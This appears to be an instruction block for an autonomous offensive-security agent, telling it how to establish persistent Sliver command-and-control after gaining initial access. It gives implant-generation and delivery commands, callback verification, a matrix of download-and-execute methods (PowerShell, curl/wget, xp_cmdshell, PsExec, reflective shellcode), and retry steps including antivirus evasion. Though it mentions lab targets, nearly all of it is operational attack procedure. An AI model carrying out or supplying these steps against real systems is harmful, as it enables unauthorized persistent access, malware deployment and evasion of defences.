## C2 Deployment Instructions

You have gained initial access to the target. Your next step is to establish
persistent C2 access via Sliver.

### Steps:

1. **Identify target OS/arch** from prior recon (services.json, tech_fingerprint.json)

2. **Generate implant** using the helper script:
   ```bash
   # Windows session implant (most common for lab targets)
   python3 /opt/tazosploit/scripts/generate_implant.py \
     --os windows --arch amd64 --transport mtls --mode session --json

   # Linux session implant
   python3 /opt/tazosploit/scripts/generate_implant.py \
     --os linux --arch amd64 --transport mtls --mode session --json

   # Shellcode format (for memory-only delivery or evasion pipeline)
   python3 /opt/tazosploit/scripts/generate_implant.py \
     --os windows --arch amd64 --format shellcode --evasion --json
   ```

3. **Get delivery commands** based on your access type:
   ```bash
   # If you have command execution (RCE)
   python3 /opt/tazosploit/scripts/deliver_payload.py \
     --access-type rce --implant /tmp/implant.exe \
     --target-os windows --kali-ip $(hostname -I | awk '{print $1}') --json

   # If you have file upload
   python3 /opt/tazosploit/scripts/deliver_payload.py \
     --access-type file_upload --implant /tmp/implant.exe \
     --target-os windows --json

   # If you have SSH access
   python3 /opt/tazosploit/scripts/deliver_payload.py \
     --access-type ssh --implant /tmp/implant \
     --target-os linux --target 192.168.4.125 --creds 'user:pass' --json
   ```

4. **Execute delivery** using the generated commands

5. **Verify callback**:
   ```bash
   python3 /opt/tazosploit/scripts/verify_callback.py \
     --target 192.168.4.125 --mode session --timeout 120 --json
   ```

6. **Record session ID** — verify_callback.py automatically writes `c2_session.json`

### Decision Matrix:

| Access Type | Target OS | Delivery Method |
|------------|-----------|-----------------|
| RCE | Windows | PowerShell download + execute |
| RCE | Linux | curl/wget download + execute |
| File upload | Any | Upload through vuln, then execute |
| Web shell | Any | Shell → download + execute |
| SQLi (stacked) | Windows | xp_cmdshell → PowerShell |
| SQLi (stacked) | Linux | COPY TO PROGRAM → curl |
| SMB access | Windows | smbclient upload + PsExec |
| SSH access | Linux | SCP + execute |
| Memory only | Any | Reflective shellcode injection |

### Success = C2 callback received. Failure = retry with different format/delivery.

### If callback fails:
1. Check if implant format matches target OS/arch
2. Try different delivery method (e.g., wget instead of curl)
3. Check firewall rules — try different transport (HTTPS, DNS)
4. Check if AV caught the implant — apply evasion pipeline
5. After 3 failures, fall back to manual post-exploitation
